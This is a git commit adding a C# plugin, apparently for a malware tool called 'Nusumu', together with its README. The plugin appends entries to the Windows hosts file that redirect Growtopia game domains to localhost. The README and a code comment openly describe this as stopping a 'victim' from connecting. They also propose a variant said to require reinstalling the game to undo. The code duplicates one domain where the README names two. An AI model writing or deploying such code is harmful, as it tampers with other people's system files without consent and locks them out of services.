e25b147eab81d82339c837a5ae77d236467b778a
Cantue35 <cantuegaming@gmail.com>
2020-12-08 22:14:15 +0300

    Initial Commit

---
+++ NusumuPluginHostsChanger.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace NusumuPlugintest
+{
+    public class NusumuPluginHostsChanger
+    {
+        //DO NOT ADD PARAMETERS!
+        //Plugin will not work with parameters ex: Execute(object obj1, object obj2)
+        public static void Execute()
+        {
+            var systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
+            Console.WriteLine(systemPath);
+            var path = Path.Combine(systemPath, @"drivers\etc\hosts");
+            using (var stream = new StreamWriter(path, true, Encoding.Default))
+            {
+                stream.WriteLine("\n" +
+                    "127.0.0.1 growtopia1.com\n" +
+                    "127.0.0.1 growtopia1.com\n");/*If you want you can change them to 127.0.0.1 growtopia7.com
+             that will make the victim unable to connect also this can not be fixed by deleting hosts file, the only fix is reinstalling growtopia.*/
+            }
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,5 +1,10 @@
-# NusumuPluginHostsChanger
+# Nusumu Plugin Hosts Changer
+
 Adds
 127.0.0.1 growtopia1.com
-127.0.0.1 growtopia2.com to hosts when executed. So the victim can't login. Also you can improve it by changing them to 
-127.0.0.1 growtopia7.com, this will make the victim unable to connect also this cannot be fixed by deleting hosts file, the only fix is reinstalling growtopia.
+127.0.0.1 growtopia2.com
+to hosts when executed. That makes victim unable to connect.
+
+## Reminders
+You can improve it by changing them to 127.0.0.1 growtopia7.com, that will make victim unable to connect also this cannot be fixed by deleting hosts file, the only fix is reinstalling growtopia.
+
